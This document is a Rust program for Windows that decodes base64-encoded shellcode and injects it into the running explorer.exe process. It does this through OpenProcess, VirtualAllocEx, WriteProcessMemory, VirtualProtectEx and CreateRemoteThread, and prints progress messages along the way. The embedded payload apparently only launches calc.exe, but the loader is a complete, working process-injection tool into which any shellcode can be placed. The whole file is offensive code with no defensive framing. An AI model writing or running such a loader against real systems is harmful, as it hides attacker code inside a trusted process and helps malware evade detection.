use base64::decode;
use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

fn inject_remote(shellcode: &[u8], process_id: u32){
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        println!("[+] Got target process handle: {:?}", process_handle);
        let allocated_memory = VirtualAllocEx(
            process_handle,          
            ptr::null_mut(),          
            shellcode.len(),          
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE,          
        );

        if allocated_memory.is_null() {
            panic!("Failed to allocate memory.");
        }

        println!(
            "[+] Allocated RX memory in remote process at address {:?}",
            allocated_memory
        );

        let mut bytes_written = 0;
        WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode.as_ptr() as _, 
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Wrote {} bytes to remote process memory", bytes_written);

        let mut old_protect = 0;

        let mem_protect = VirtualProtectEx(
            process_handle,
            allocated_memory,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            panic!("Failed to change memory protection.");
        }

        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(allocated_memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        println!("[+] Created remote thread!");

        WaitForSingleObject(thread_handle, INFINITE);

        VirtualFreeEx(
            process_handle,
            allocated_memory,
            0,
            MEM_RELEASE,
        );

        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

fn main() {
    let shellcode_b64 = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VQzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQA=";// base64 string
    
    let decoded = decode(shellcode_b64).expect("Invalid base64 string");

    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name("explorer")
        .next()
        .unwrap()
        .pid()
        .as_u32();
    println!("[+] Found explorer.exe with PID {}", process_id);
    inject_remote(&decoded, process_id);
}
